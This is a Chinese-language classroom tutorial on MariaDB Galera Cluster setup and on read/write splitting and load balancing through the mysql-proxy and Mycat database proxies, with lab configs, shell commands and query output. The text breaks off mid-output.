集群MariaDB作为Mysql的一个分支，在开源项目中已经广泛使用，例如大热的openstack，所以，为了保证服务的高可用性，同时提高系统的负载能力，集群部署是必不可少的。 MariaDB Galera Cluster 介绍 MariaDB集群是MariaDB同步多主机集群。它仅支持XtraDB/ InnoDB存储引擎（虽然有对MyISAM实验支持 - 看wsrep_replicate_myisam系统变量）。 主要功能: 同步复制 真正的multi-master，即所有节点可以同时读写数据库 自动的节点成员控制，失效节点自动被清除 新节点加入数据自动复制 真正的并行复制，行级 用户可以直接连接集群，使用感受上与MySQL完全一致 优势: 因为是多主，所以不存在Slavelag(延迟) 不存在丢失事务的情况 同时具有读和写的扩展能力 更小的客户端延迟 节点间数据是同步的,而Master/Slave模式是异步的,不同slave上的binlog可能是不同的 技术: Galera集群的复制功能基于Galeralibrary实现,为了让MySQL与Galera library通讯，特别针对MySQL开发了wsrep API。 Galera插件保证集群同步数据，保持数据的一致性，靠的就是可认证的复制，工作原理如下图： ![](pic/14-Galera Cluster.png) 当客户端发出一个commit的指令，在事务被提交之前，所有对数据库的更改都会被write-set收集起来,并且将 write-set 纪录的内容发送给其他节点。 write-set 将在每个节点进行认证测试，测试结果决定着节点是否应用write-set更改数据。 如果认证测试失败，节点将丢弃 write-set ；如果认证测试成功，则事务提交。 软件的获取 http://classroom.example.com/materials/mariadb-10.2.repo http://classroom.example.com/materials/thirdpart.repo 集群配置要求 安装4个节点 关闭第一个节点后重起服务，需要修改配置文件， 关闭第三个节点，去查看错误日志，在集群中作插入动作，重起服务，看是否能够同步到数据。 详细步骤 1.安装软件包12345galera 25.3.15jemalloc* MariaDB-client 10.2 MariaDB-server 10.2 MariaDB-compat 10.2 需要先卸载mariadb-libs 123# rpm -e mariadb-libs --nodeps# rpm -e mariadb-common --nodeps# yum install -y galera jemalloc* MariaDB-client MariaDB-server MariaDB-compat 2.初始化MariaDB数据库并启动MariaDB服务，并作安全加固 123# systemctl start mysql# mysql_secure_installation# systemctl stop mysql 3.配置 12345678910111213141516171819202122vim /etc/my.cnf.d/galera.cnf[galera]# Mandatory settingswsrep_on=ONwsrep_provider=/usr/lib64/galera/libgalera_smm.so#启动节点时需要指定galera cluster的地址,作为cluster中第一个启动的节点,wsrep_cluster_address=gcomm://,对于后续启动的节点,wsrep_cluster_address=gcomm://node1,node2,node3wsrep_cluster_address=&apos;gcomm://&apos;#所有node必须一样wsrep_cluster_name=&apos;galera&apos;#节点地址wsrep_node_address=&apos;172.25.0.11&apos;#节点名称wsrep_node_name=&apos;galera1&apos;#Snapshot State Transter快照状态转移方法:mysqldump/rsync,默认mysqldumpwsrep_sst_method=rsync#binlog的格式也有三种：STATEMENT，ROW，MIXEDbinlog_format=rowdefault_storage_engine=InnoDB#调整锁策略的innodb_autoinc_lock_mode=2bind-address=0.0.0.0 4.启动 123456systemctl start mysql#查看目前mysql的端口netstat -ntpl|grep sqltcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 12877/mysqld tcp 0 0 0.0.0.0:4567 0.0.0.0:* LISTEN 12877/mysqld 5.其他节点上做相同配置 依次启动其他节点,其他节点会根据配置自动加入集群并同步数据，一定要关闭selinux，或者设为0 1234567891011121314[galera]# Mandatory settingswsrep_on=ONwsrep_provider=/usr/lib64/galera/libgalera_smm.sowsrep_cluster_address=&apos;gcomm://172.25.0.11&apos;wsrep_cluster_name=&apos;galera&apos;wsrep_node_address=&apos;172.25.0.12&apos;wsrep_node_name=&apos;&lt;注意这里与解析的主机名相同&gt;&apos;wsrep_sst_method=rsyncbinlog_format=rowdefault_storage_engine=InnoDBinnodb_autoinc_lock_mode=2bind-address=0.0.0.0 6.观察日志 1[root@mastera0 ~]# tail -f /var/log/mysqld.log 7.在galera上查看集群状态 12345678910111213141516171819MariaDB [(none)]&gt; show global status like &apos;wsrep_cluster%&apos;;+--------------------------+--------------------------------------+| Variable_name | Value |+--------------------------+--------------------------------------+| wsrep_cluster_conf_id | 14 || wsrep_cluster_size | 2 || wsrep_cluster_state_uuid | ff8cb12b-168a-11e6-ba3c-b36f59743764 || wsrep_cluster_status | Primary |+--------------------------+--------------------------------------+MariaDB [(none)]&gt; show global status like &apos;wsrep_cluster%&apos;;+--------------------------+--------------------------------------+| Variable_name | Value |+--------------------------+--------------------------------------+| wsrep_cluster_conf_id | 15 || wsrep_cluster_size | 3 || wsrep_cluster_state_uuid | ff8cb12b-168a-11e6-ba3c-b36f59743764 || wsrep_cluster_status | Primary |+--------------------------+--------------------------------------+ 8.测试 1.在一节点上新建表并插入数据以在其他实例上观测数据是否同步 2.测试节点故障机恢复A.masterb slavea B.mastera停掉之后，需要修改配置文件，才能重新加入。 我们可以关注几个关键的参数: wsrep_connected = on 链接已开启 wsrep_local_index = 1 在集群中的索引值 wsrep_cluster_size =3集群中节点的数量 wsrep_incoming_addresses = 172.25.0.11:3306,172.25.0.12:3306,172.25.0.13:3306 集群中节点的访问地址 故障转移和故障恢复我们回忆一下，一开始我们只有一台数据库服务器，rhel7的操作系统，maraidb-server5.5版本。 1.1：用户少，数据量也不多，每天用tar打包压缩好，拷贝出来，这种方法每次都要停掉服务； 1.2：tar打包太慢了，数据再增长会更慢；用LVM 快照方式，备份的时候要加读锁flush tables with read lock；瞬间完成后解锁unlock tables;再挂在拷贝出来；还原的时候数据大小决定还原时间长短 1.3：希望备份过程中保持数据一致性和服务可用性；改用mysqldump，结合二进制日志。每天早上8点做全备份；恢复的时候，先导入全备份，然后根据binlog做重演 1.4：用户数量越来越多，数据库从原来几个G到现在已经变成20个G了，用mysqldump命令太慢了，于是改用percona xtrabackup工具。并且制定了一个备份计划： 12345678周一8：00 全备份；周二8：00 增量备份；周三8：00 增量备份；周四8：00 增量备份；周五8：00 增量备份；周六8：00 增量备份；周日8：00 增量备份；恢复的时候，也很方便。 2.1：服务器宕机了，希望瞬间切换到另一台，于是添加一台服务器slavea，做主从同步。 2.2：防止从机单点故障，增加一台slaveb 2.3：如果 master 是单点故障,如何解决？多级主从 multi-source，两个主服务器，两个从服务器，作multi-source,如果一台主服务器宕掉了，那么从服务器会自动去找第二台主服务器。 问题的提出两台master是否都能连呢？ 好了，现在我们前面的客户端要来连接数据库，是连接M1，还是M2呢?如果同时对M1和M2执行读写操作，在这个过程中，是否会出问题呢？我们可以来做个小游戏！找一个学生Tom连接M1，另一个学生Jack连接了M2，现在，他们同时对数据库进行写操作，修改db1.t1中的id=4的行，改为99，然后查看一下t1表的结果。 从结果看，同时多个用户对同一张表的同一个数据进行写操作，会有冲突的。所以写操作每次只给一台服务最好，但是如果用户不多，数据不多，问题也不大。 当前的困境 前端的应用程序无法使用多台数据库，前端只能指定一台数据库的ip地址，也就是说，如果你让前端应用连接M1，那么所有的读写操作都是通过M1，那么其他数据库除了热备的作用以外就没有了。这样很浪费性能，而且当我们前端的请求越来越多，一台数据库服务器会非常的吃力，既要响应读请求，还要响应写请求，他的压力会非常的大。如果M1宕机了，还要手动切换到M2，这样的效果并不是我们想要的，我们肯定希望他能瞬间切换。 另外，让前端应用连接slave就更不行了，如果在从机上触发写操作，那么主从同步将会被断开，因为从机的数据一定要和主机一模一样，不然就会有冲突了。 所以总结一下，现在我们遇到的困境： 有多台数据库服务器，但是只能使用一台，不能作负载均衡（将前端用户的请求均衡地分配给后端的服务器） 如果一台主服务器坏了，那么需要手动切换，不能做到瞬间自动切换 两台slave只作为备份使用，浪费性能，虽然不能用来写，但是可以用来读取数据 从上面的总结来看，我们希望在这个架构下，能够实现更多的功能，比如： 负载均衡 就是说能够均衡地分配前端的用户请求 . 读写分离 两台master用来写，两台slave用来读，提升整体性能 解决方案如何解决呢？ 第一种方案——在应用中处理故障转移，找开发人员作二次开发，将前端应用代码修改，让他能够实现上面的功能； 第二种方案——中间件解决方案，在前端应用和后台数据库之间添加一台代理服务器。通过数据库的mysql协议去转发sql语句。如果后面数据库是oracle数据库，那么这个反向代理服务器就应该能够支持oracle的协议，监听oracle的端口，能跟oracle进行通信。 我们来讲第二种方法。 什么是数据库代理服务器 如果一个服务器能够支持数据库的协议，并且能够转发sql语句，我们就把他称之为数据库代理服务器。 负载均衡 数据库代理和web服务器的代理都需要具备一些基本代理服务器的功能，比如，负载均衡，至少要能实现负载均衡，我们后端有多台服务器，那么代理服务器能够将前端用户的请求以相对均衡的方式分担到后端多台服务器上面。 读写分离 如果我们后端的数据库不存在主和从的关系，大家都是master，任何一条语句都能写，那么发给谁都没有太大关系；但是如果后面是master和slave的关系，那么我们说从机是不能进行写操作的，所以在负载均衡，分发sql的过程当中，你的代理服务器要能够识别读和写，然后把读操作都分发给slave，写分发给master，我们把这个功能叫做读写分离。 负载均衡和读写分离是数据库代理服务器当中最基本的两个功能。你用任何一个数据库代理服务器，都需要这两个功能。如果不具备这两个功能，那基本上没人用。 作为代理服务器，他存在于我们客户端和数据库服务器之间，后端的数据库服务器不需要知道客户端的ip地址，他只要知道谁来找我的，谁发请求给我的，对于客户端来说，他不需要知道数据库服务器的地址，他只要知道代理就行了，后面怎么执行他不管。也就是说现在客户端不再直接与数据库服务器通信了，而是通过代理服务器进行通讯，代理服务器实现负载均衡，实现读写分离。 分库、分表、分片 进阶级的还会有其他的功能，比如一些优秀的代理服务器，可以实现分库、分表、分片；sql路由并发查询；sql过滤 举例说明： 4个库db1 db2 db3 db4，后面4台数据库做主从同步，他们的数据都是相同的，现在用户发起请求要访问db1，db1上有5张表，经过轮询，代理服务器将请求分发给了M1；如果用户再次访问db1，那么代理服务器还会将请求发给M1，M1上刚刚读过一个db1的文件，会产生缓存，所以再读一次的时候速度就很快了；如果轮询没有给到M1，而是给了S1，那么S1就要再读一次db1的文件，产生db1的缓存；如果用户再访问，可能这次分发给了S2，那么S2也要再读一次db1的文件，并产生db1的缓存。最终的结果就是四台机器将相同的数据都缓冲了，最终导致的问题就是我们的内存会有所浪费，因为内存里面缓冲的是一样的数据。而我们后端有4个库，不单单是db1，还有db2，3，4，用户在负载均衡的过程中，最终导致的结果是四台服务器全部把四个库的所有的表都尝试做缓冲，这四台服务器中有大量的数据是重复的，我们认为这是一种非常大的浪费，我们想减少这些性能消耗，怎么做呢？ 在第一台数据只缓冲db1，第二台db2，第三台db3，第四台db4，用户访问哪个库就分给哪台服务器，这是一种比较好的方法。这样的话，能够保证用户发出请求后能够较快地返回结果，服务器的内存缓冲得到充分的利用。不单单提高了性能，还节约了内存，避免了数据的重复。 相同的理念，刚刚举的是库的例子，同样表也同样适用，不同的服务器缓冲不同的表。 这是我们将的分库、分表的功能，还有一个分片，指的是什么呢？ 举例说明：只有t1一张表，发给谁呢？四台机器轮询地发，那么t1表的内容被四台机器全部缓冲下来，又会浪费内存。而且机器数量越多，性能浪费越大。那么我们怎么办呢？ 可以这么做： 服务器 缓冲 m1 1 5 9 m2 2 6 10 s1 3 7 11 s2 4 8 12 按照行来分发，这样的话问题就解决拉！这就是分片，这样就不会浪费性能，数据就不会重复拉！ sql路由并发查询 案例：如果用户要执行select * from t1 where id=1 or id=8;怎么办呢？代理服务器是分发给m1还是s2呢？ 当这条语句经过代理服务器的时候，被一分为二，一条是select * from t1 where id=1;一条是select * from t1 where id=8; 然后同时发给两台不同的服务器，将查询结果取出来，合并一下，然后返回给前端。这个叫做sql路由并发查询。 目前市面上的数据库代理服务器我们会去讲目前市面上的一些数据库代理服务器。目前数据库代理好用的真心比较少，非常少，包括mysql官方也开发过代理，非常地烂，破东西，开发了好多年了，一直很烂；然后呢，淘宝有自己的代理，但没有开源出来，或者说开源出来了不能用，他的代理要用在他们的那套基础架构上，而基础架构没开源出来，仅程序开源出来没用，没有运行环境；奇虎360对mysql-proxy做了更改，性能做了优化，优化下来的效果还可以，比官方好很多，运行的环境虽然开源出来了，但是不能在el7上跑，el6、el5可以跑，这东西没办法讲，我们知道一下，以后大家做代理不要用el7，用el5、el6可以跑着试试看；然后会去讲另外一个代理mycat，前生是阿里巴巴的数据库代理，阿里巴巴和淘宝用的数据库代理是两套程序，阿里巴巴之前的数据库代理各种坑，坑到他的开发人员实在受不了了，然后就自己组织了一批人，开始重写代码，将各种坑补掉，重写出来的这个开源产品呢就叫mycat，有理由相信mycat以后会越来越好，因为他有一个非常坚实的基础，就是他是拿阿里巴巴的系统，经过线上生产环境验证的一个代理服务器，拿他来改的，而且还补全了他很多的不足，把他变成了一个企业级的产品，目前mycat的用户并不算多，但是他的市场份额一直在逐步增加，从开源领域的代理服务器来讲，这个mycat还是非常不错的。 我们会举两个例子，mysql官方的 mysql-proxy，其实我是不想讲mysql官方的，讲这东西也没太大用处，他有些自己的缺点，当然了，这些缺点并不是不能克服的，可以解决，解决的前提是你需要会开发，他里面有一些代码要你自己改，因为他官方的代码比较烂。另一个就是mycat。去实现两个功能，负载均衡和读写分离。 DBPROXY Mysql-proxy lua脚本 魔兽世界 tddl 淘宝的数据库代理 没有运行环境 atlas 奇虎360的数据库代理[ 希腊神话被罚作苦役的大力神 ] rhel7不能用 cobar 阿里巴巴 测试版不能用 mycat 阿里巴巴二次开发 商业型产品 首先，我们来看一下我们项目的一个网络架构。 mysql-proxy 数据库中间件 mysql-proxy 0.8.5 实现 读写分离负载均衡 1.网络拓扑规划 服务器 IP software mastera0 172.25.0.11 mariadb5.5 masterb0 172.25.0.12 mariadb5.5 slavea0 172.25.0.13 mariadb5.5 slaveb0 172.25.0.14 mariadb5.5 dbproxy0 172.25.0.15 mysql-proxy0.8.5 2.安装软件 1）无密码ssh登陆虚拟机 12ssh-keygen -t rsafor i in 10 11 12 13 14 15 ;do ssh-copy-id root@172.25.0.$i ;done 2）关闭selinux,firewalld 12345for i in 10 11 12 13 14 15 ;\\do ssh root@172.25.0.$i \\\\&quot;sed -i &apos;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config;\\grep -v &quot;^#&quot; /etc/selinux/config;\\systemctl stop firewalld \\&quot;;done 3）需要安装的软件包wget，net-tools,rpc-bind,nfs-utils,vim for i in 10 11 12 13 14 ;do ssh root@172.25.0.$i &quot;yum install -y wget net-tools rpc-bind nfs-utils vim &quot;;done 4）查看ip地址ip addr 5）修改yum源，根据实际需求来 从服务器上下载到/etc/yum.repos.d/目录 123456cd /etc/yum.repos.d &amp;&amp; \\wget http://classroom.example.com/materials/mariadb-10.2.repo;\\wget http://classroom.example.com/materials/mysql-5.7.repo;\\wget http://classroom.example.com/materials/thirdpart.repoyum clean all &amp;&amp; yum makecache 6) 安装mariadb-server，并启动服务 12for i in 11 12 13 14 ;do ssh root@172.25.0.$i &quot;yum install -y mariadb-server&quot; ;donefor i in 11 12 13 14 ;do ssh root@172.25.0.$i &quot;systemctl start mariadb&quot; ;done 7) 安装依赖包 yum install gcc* lua lua-devel libevent libevent-devel glib2 glib2-devel pkgconfig mariadb-devel flex 8) 安装mysql-proxy 123456wget http://172.25.254.254/content/courses/db100/rhel7.2/materials/mysql-proxy-0.8.5.tar.gztar -zxf mysql-proxy-0.8.5.tar.gzcd mysql-proxy-0.8.5./configure --prefix=/usr/local/mysql-proxymakemake install 3.配置 设置密码 1for i in 11 12 13 14 ;do ssh root@172.25.0.$i &quot;mysqladmin -uroot password uplooking&quot; ;done 1）mastera0 1234567mysql -uroot -puplooking&gt; create database db1;&gt; use db1;&gt; create table t1 (num int not null);&gt; insert into t1 values (1);&gt; grant all on db1.* to &apos;mysql-proxy&apos;@172.25.0.15 identified by &apos;uplooking&apos;;&gt; flush privileges; 2）slavea0 1234567mysql -uroot -puplooking&gt; create database db1;&gt; use db1;&gt; create table t1 (num int not null);&gt; insert into t1 values (2);&gt; grant all on db1.* to &apos;mysql-proxy&apos;@172.25.0.15 identified by &apos;uplooking&apos;;&gt; flush privileges; 3) 进入mysql-proxy的家目录/usr/local/mysql-proxy 12345678cd /usr/local/mysql-proxy/;ls# bin include lib libexec sharecd bin;ls# mysql-binlog-dump mysql-myisam-dump mysql-proxy./mysql-proxy --help-all---》查看命令帮助./mysql-proxy -P 172.25.0.15:3306 -b 172.25.0.11:3306 -b 172.25.0.13:3306 &amp;netstat -ntalp|grep 3306# tcp 0 0 172.25.0.15:3306 0.0.0.0:* LISTEN 24483/./mysql-proxy 4.测试 客户端 172.25.0.10 12345678mysql -u&apos;mysql-proxy&apos; -puplooking -h172.25.0.15&gt; use db1;&gt; select * from t1;+-----+| num |+-----+| 1 |+-----+ 将mastera0的服务关闭后，再查看表1中的内容 12345678910111213141516systemctl stop mariadbmysql -u&apos;mysql-proxy&apos; -puplooking -h172.25.0.15&gt; select * from t1;ERROR 2013 (HY000): Lost connection to MySQL server during queryMariaDB [db1]&gt; select * from t1;ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 5Current database: db1+-----+| num |+-----+| 2 |+-----+ 5.配置 1）将lua脚本复制到mysql-proxy的家目录 cp ~/mysql-proxy-0.8.5/lib/rw-splitting.lua /usr/local/mysql-proxy/ 2) mastera0读写，slavea0只读，通过lua脚本 ./mysql-proxy -P 172.25.0.15:3306 -b 172.25.0.11:3306 -r 172.25.0.13:3306 -s /usr/local/mysql-proxy/rw-splitting.lua 6.测试 1）客户端上登陆后插入33； 123mysql -u&apos;mysql-proxy&apos; -puplooking -h172.25.0.15&gt; use db1;&gt; insert into t1 values (33); 2）mastera0查看t1表； 123456789mysql -u&apos;mysql-proxy&apos; -puplooking -h172.25.0.15&gt; use db1;&gt; select * from t1;+-----+| num |+-----+| 1 || 33 |+-----+ 3）slavea0查看t1； 1234567mysql -u&apos;mysql-proxy&apos; -puplooking -h172.25.0.15&gt; select * from t1;+-----+| num |+-----+| 2 |+-----+ 4）客户端查看t1表； 1234567mysql -u&apos;mysql-proxy&apos; -puplooking -h172.25.0.15&gt; select * from t1;+-----+| num |+-----+| 2 |+-----+ mycat2013 年阿里的 Cobar 在社区使用过程中出现存在一些比较严重的问题,及其使用限制，经过 Mycat 第一次改良,第一代改良版——Mycat 诞生。 Mycat 开源之后,一些 Cobar 的用户参与了 Mycat 的开发,最终 Mycat 发展成为一个由众多软件公司的实力派架构师和资深开发人员维护的社区型开源软件。 Mycat 捐赠地址 :http://www.mycat.io/donate.html Mycat 官网网站:http://www.mycat.io/ Mycat 源码:https://github.com/MyCATApache/Mycat-Server Mycat 下载地址:https://github.com/MyCATApache/Mycat-download 1.网络拓扑规划 服务器 IP software mastera0 172.25.0.11 mariadb5.5 masterb0 172.25.0.12 mariadb5.5 slavea0 172.25.0.13 mariadb5.5 slaveb0 172.25.0.14 mariadb5.5 dbproxy0 172.25.0.15 mysql-proxy0.8.5 2.安装软件 安装jdk软件 因为mycat是用java语言编写的,并宣告家目录 12345# wget http://172.25.254.254/content/class/mariadb/mycat/jdk-7u79-linux-x64.rpm# wget http://172.25.254.254/content/class/mariadb/mycat/Mycat-server-1.5.1-RELEASE-20160328130228-linux.tar.gz# rpm -ivh jdk-7u79-liunux-x64.rpm# rpm -ql jdk|head# export JAVA_HOME=&apos;/usr/java/jdk1.7.0_79&apos; 临时生效，如果要永久生效需要写到bash启动脚本中例如/etc/bashrc 安装mycat 直接解压缩即可使用 123456789*************************************bin mycat启动脚本conf schema.xml 数据库配置 server.xml 逻辑库配置*************************************[root@dbproxy0 ~]# tar xf Mycat-server-1.5.1-RELEASE-20160328130228-linux.tar.gz -C /usr/local[root@dbproxy0 ~]# cd /usr/local;ls[root@dbproxy0 local]# cd mycat;ll[root@dbproxy0 mycat]# chmod 755 * -R 4.配置文件 12[root@dbproxy0 mycat]# vim conf/schema.xml[root@dbproxy0 mycat]# vim conf/server.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970server.xml#用户名、密码、逻辑库名需要自定义&lt;user name=&quot;test&quot;&gt; &lt;property name=&quot;password&quot;&gt;test&lt;/property&gt; 注意：此处test是密码 &lt;property name=&quot;schemas&quot;&gt;TESTDB&lt;/property&gt;&lt;/user&gt;&lt;system&gt;#新增服务端口 &lt;property name=&quot;servicePort&quot;&gt;3306&lt;/property&gt;&lt;/system&gt;****************************&lt;mycat:schema xmlns:mycat=&quot;http://org.opencloudb/&quot;&gt; &lt;schema name=&quot;TESTDB&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot;&gt; &lt;!-- auto sharding by id (long) --&gt; &lt;table name=&quot;travelrecord&quot; dataNode=&quot;dn1,dn2,dn3&quot; rule=&quot;auto-sharding-long&quot; /&gt; &lt;table name=&quot;t1&quot; dataNode=&quot;dn1&quot; /&gt; &lt;!-- global table is auto cloned to all defined data nodes ,so can join with any table whose sharding node is in the same data node --&gt; &lt;table name=&quot;company&quot; primaryKey=&quot;ID&quot; type=&quot;global&quot; dataNode=&quot;dn1,dn2,dn3&quot; /&gt; &lt;table name=&quot;goods&quot; primaryKey=&quot;ID&quot; type=&quot;global&quot; dataNode=&quot;dn1,dn2&quot; /&gt; &lt;!-- random sharding using mod sharind rule --&gt; &lt;table name=&quot;hotnews&quot; primaryKey=&quot;ID&quot; dataNode=&quot;dn1,dn2,dn3&quot; rule=&quot;mod-long&quot; /&gt; &lt;!-- &lt;table name=&quot;dual&quot; primaryKey=&quot;ID&quot; dataNode=&quot;dnx,dnoracle2&quot; type=&quot;global&quot; needAddLimit=&quot;false&quot;/&gt; &lt;table name=&quot;worker&quot; primaryKey=&quot;ID&quot; dataNode=&quot;jdbc_dn1,jdbc_dn2,jdbc_dn3&quot; rule=&quot;mod-long&quot; /&gt; --&gt; &lt;table name=&quot;employee&quot; primaryKey=&quot;ID&quot; dataNode=&quot;dn1,dn2&quot; rule=&quot;sharding-by-intfile&quot; /&gt; &lt;table name=&quot;customer&quot; primaryKey=&quot;ID&quot; dataNode=&quot;dn1,dn2&quot; rule=&quot;sharding-by-intfile&quot;&gt; &lt;childTable name=&quot;orders&quot; primaryKey=&quot;ID&quot; joinKey=&quot;customer_id&quot; parentKey=&quot;id&quot;&gt; &lt;childTable name=&quot;order_items&quot; joinKey=&quot;order_id&quot; parentKey=&quot;id&quot; /&gt; &lt;/childTable&gt; &lt;childTable name=&quot;customer_addr&quot; primaryKey=&quot;ID&quot; joinKey=&quot;customer_id&quot; parentKey=&quot;id&quot; /&gt; &lt;/table&gt; &lt;!-- &lt;table name=&quot;oc_call&quot; primaryKey=&quot;ID&quot; dataNode=&quot;dn1$0-743&quot; rule=&quot;latest-month-calldate&quot; /&gt; --&gt; &lt;/schema&gt;&lt;dataNode name=&quot;dn1&quot; dataHost=&quot;localhost1&quot; database=&quot;db1&quot; /&gt;&lt;dataHost name=&quot;localhost1&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;3&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot; slaveThreshold=&quot;100&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;mastera&quot; url=&quot;172.25.0.11:3306&quot; user=&quot;mysqlproxy&quot; password=&quot;uplooking&quot;&gt; &lt;readHost host=&quot;slavea&quot; url=&quot;172.25.0.13:3306&quot; user=&quot;mysqlproxy&quot; password=&quot;uplooking&quot; /&gt; &lt;readHost host=&quot;slaveb&quot; url=&quot;172.25.0.14:3306&quot; user=&quot;mysqlproxy&quot; password=&quot;uplooking&quot; /&gt; &lt;/writeHost&gt; &lt;writeHost host=&quot;masterb&quot; url=&quot;172.25.0.12:3306&quot; user=&quot;mysqlproxy&quot; password=&quot;uplooking&quot;&gt; &lt;readHost host=&quot;slavea&quot; url=&quot;172.25.0.13:3306&quot; user=&quot;mysqlproxy&quot; password=&quot;uplooking&quot; /&gt; &lt;readHost host=&quot;slaveb&quot; url=&quot;172.25.0.14:3306&quot; user=&quot;mysqlproxy&quot; password=&quot;uplooking&quot; /&gt; &lt;/writeHost&gt;&lt;/dataHost&gt;&lt;/mycat:schema&gt; 5）启动服务 123456789101112[root@dbproxy0 mycat]# bin/mycat start[root@dbproxy0 mycat]# netstat -luntp|grep tcptcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1190/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1853/master tcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 3168/java tcp6 0 0 :::3306 :::* LISTEN 3168/java tcp6 0 0 :::9066 :::* LISTEN 3168/java tcp6 0 0 :::46764 :::* LISTEN 3168/java tcp6 0 0 :::22 :::* LISTEN 1190/sshd tcp6 0 0 ::1:25 :::* LISTEN 1853/master tcp6 0 0 :::1984 :::* LISTEN 3168/java tcp6 0 0 :::43493 :::* LISTEN 3168/java 6）测试 mycat的master每次之能用一个来写，以这种方法来防止两台master产生冲突。当其中一台master宕机以后，可以自动切换。 balance 属性 负载均衡类型有 3 种: balance=”0”, master可读可写，slave不使用，也就是不启动读写分离 balance=”1”,master可读可写，slave只读；stand by writeHost 参与 select 询句癿负载均衡 balance=”2”,master可读可写，slave只读；所有读操作都随机的在 master和slave上分配。 balance=”3”,master只写，slave只读；1.4版本以后有 switchType 属性 -1 表示不自动切换 1 默认值,自动切换 2 基于 MySQL 主从同步的状态决定是否切换 更多内容 请查看《Mycat 权威指南》 实战项目 实战项目1： 数据库中间件 mysql-proxy 0.8.5 实现 读写分离负载均衡，后端数据库服务器为 MySQL 5.7 M-M-S-S Multisource Replication 高可用架构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199软件名 mysql-proxy http://classroom.example.com/materials/mysql-proxy-0.8.5.tar.gz服务启动脚本 mysql-proxy -P, --proxy-address=&lt;host:port&gt; 4040 指定mysql-proxy运行的位置和端口号 -b, --proxy-backend-addresses=&lt;host:port&gt; 可读可写 -r, --proxy-read-only-backend-addresses=&lt;host:port&gt; 只读 -s, --proxy-lua-script=&lt;file&gt; lua脚本 # 安装并启动mysql-proxy1）依赖关系yum install -y gcc* libev lua lua-devel libevent libevent-devel glib2 glib2-devel pkgconfig mariadb-devel flex2）源码编译1.configure2.make3.make install---------------3）启动服务mysql-proxy -P 172.25.0.15:3306 -b 172.25.0.11:3306 -b 172.25.0.12:3306 -r 172.25.0.13:3306 -r 172.25.0.14:3306 -s /usr/local/mysql-proxy/rw-splitting.lua注意，启动服务之前需要： 1）关闭所有服务器的selinux和firewalld 2）后端真实数据库需要给dbproxy授权---------------mysql-proxy详细步骤1.网络拓扑规划mastera0 172.25.0.11 mariadb5.7 mysql-5.7.repomasterb0 172.25.0.12 mariadb5.7 mysql-5.7.reposlavea0 172.25.0.13 mariadb5.7 mysql-5.7.reposlaveb0 172.25.0.14 mariadb5.7 mysql-5.7.repodbproxy0 172.25.0.15 mysql-proxy0.8.5 thirdpart.repo2.安装软件1）无密码ssh登陆虚拟机# ssh-keygen -t rsa# for i in 10 11 12 13 14 15 ;do ssh-copy-id root@172.25.0.$i ;done2）关闭selinux,firewalldfor i in 10 11 12 13 14 15 ;\\do ssh root@172.25.0.$i \\&quot;sed -i &apos;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config;\\grep -v &quot;^#&quot; /etc/selinux/config;\\systemctl stop firewalld;setenforce 0 &quot;;done3）需要安装的软件包wget，net-tools,rpc-bind,nfs-utils,vimfor i in 10 11 12 13 14 ;do ssh root@172.25.0.$i &quot;yum install -y wget net-tools rpc-bind nfs-utils vim &quot;;done4）查看ip地址ip addr5）修改yum源，根据实际需求来从服务器上下载到/etc/yum.repos.d/目录6) mastera--slaveb四台数据库服务器，安装mysql5.7，并启动服务,修改初始密码为了测试中间件的功能，分别创建db1.t1mastera db1.t1 (1,&apos;mastera&apos;)masterb db1.t1 (1,&apos;masterb&apos;)slavea db1.t1 (1,&apos;slavea&apos;)slaveb db1.t1 (1,&apos;slaveb&apos;)7) dbproxy安装依赖包 (需要第三方yum源 thirdpart.repo)yum install -y gcc* libev lua lua-devel libevent libevent-devel glib2 glib2-devel pkgconfig mariadb-devel flex8) 安装mysql-proxy# wget http://172.25.254.254/content/courses/db100/rhel7.2/materials/mysql-proxy-0.8.5.tar.gz# tar -zxf mysql-proxy-0.8.5.tar.gz# cd mysql-proxy-0.8.5# ./configure --prefix=/usr/local/mysql-proxy# make# make install3) 进入mysql-proxy的家目录/usr/local/mysql-proxy# cd /usr/local/mysql-proxy/;lsbin include lib libexec share# cd bin;lsmysql-binlog-dump mysql-myisam-dump mysql-proxy# ./mysql-proxy --help-proxy # 将lua脚本复制到mysql-proxy的家目录# cp ~/mysql-proxy-0.8.5/lib/rw-splitting.lua /usr/local/mysql-proxy/# 启动服务# mysql-proxy -P 172.25.0.15:3306 -b 172.25.0.11:3306 -b 172.25.0.12:3306 -r 172.25.0.13:3306 -r 172.25.0.14:3306 -s /usr/local/mysql-proxy/rw-splitting.lua# 查看mysql-proxy监听端口号# netstat -ntalp|grep 3306tcp 0 0 172.25.0.15:3306 0.0.0.0:* LISTEN 24483/./mysql-proxy4.workstation测试(需要安装mariadb客户端，或者mysql客户端)客户端172.25.0.10# mysql -u&apos;dbproxy&apos; -p&apos;Uploo00king&apos; -h172.25.0.15MySQL [(none)]&gt; select * from db1.t1;+----+---------+| id | name |+----+---------+| 1 | mastera |+----+---------+1 row in set (0.00 sec)***************************************#将mastera0的服务关闭后，再查看表1中的内容# systemctl stop mysqld****************************************MySQL [(none)]&gt; select * from db1.t1;ERROR 2013 (HY000): Lost connection to MySQL server during queryMySQL [(none)]&gt; select * from db1.t1;ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 9Current database: *** NONE ***+----+---------+| 